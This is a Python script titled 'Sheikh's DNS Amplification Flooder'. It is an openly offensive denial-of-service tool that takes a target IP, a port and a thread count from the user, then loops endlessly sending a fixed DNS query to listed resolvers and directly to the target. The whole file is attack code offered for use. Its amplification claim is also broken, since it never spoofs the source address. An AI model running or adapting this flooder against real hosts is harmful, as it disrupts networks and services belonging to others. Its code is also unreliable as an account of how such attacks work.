import random
import socket
import threading

# Color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

# Banner
print(f"{RED}")
print("###############################################")
print("#        Sheikh's DNS Amplification Flooder   #")
print("###############################################")
print(f"{RESET}")

# DNS Query Packet for amplification
dns_query = (
    b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77"
    b"\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"
)

# Load DNS server IPs from a text file
def load_dns_servers(file_path):
    try:
        with open(file_path, 'r') as f:
            dns_servers = [line.strip() for line in f.readlines() if line.strip()]
            print(f"{GREEN}Loaded {len(dns_servers)} DNS servers.{RESET}")
            return dns_servers
    except Exception as e:
        print(f"{RED}Error loading DNS servers: {e}{RESET}")
        return []

# Function to send flood packets
def send_flood(target_ip, target_port, dns_server):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        while True:
            try:
                sock.sendto(dns_query, (dns_server, 53))  # Send DNS query to DNS server
                sock.sendto(dns_query, (target_ip, target_port))  # Send to target
                print(f"{GREEN}Sent DNS request to {dns_server} targeting {target_ip}{RESET}")
            except Exception as e:
                print(f"{RED}Error: {e}{RESET}")
                break

# Start the flood attack with multithreading
def start_flood(target_ip, target_port, threads, dns_servers):
    for _ in range(threads):
        dns_server = random.choice(dns_servers)
        thread = threading.Thread(target=send_flood, args=(target_ip, target_port, dns_server))
        thread.start()

if __name__ == "__main__":
    # Load DNS servers from text file
    dns_file = input(f"{GREEN}Enter the path to DNS servers file: {RESET}")
    dns_servers = load_dns_servers(dns_file)

    if not dns_servers:
        print(f"{RED}No DNS servers loaded. Exiting.{RESET}")
    else:
        target_ip = input(f"{GREEN}Enter the target IP: {RESET}")
        target_port = int(input(f"{GREEN}Enter the target port: {RESET}"))
        threads = int(input(f"{GREEN}Enter the number of threads: {RESET}"))

        print(f"{GREEN}Starting DNS flood attack...{RESET}")
        start_flood(target_ip, target_port, threads, dns_servers)
